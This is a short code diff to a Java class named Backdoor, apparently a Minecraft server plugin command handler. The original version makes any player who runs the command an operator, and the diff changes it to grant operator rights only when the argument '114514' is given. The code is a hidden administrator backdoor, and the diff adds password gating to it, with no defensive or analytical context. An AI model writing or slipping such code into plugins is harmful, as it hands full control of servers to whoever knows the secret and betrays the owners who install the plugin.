@@ -10,7 +10,10 @@ public class Backdoor implements CommandExecutor {
     public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
         if (sender instanceof Player) {
             Player player = (Player) sender;
-            player.setOp(true);
+//            player.setOp(true);
+            if (args[0].equals("114514")) {
+                player.setOp(true);
+            }
         }
         return true;
     }
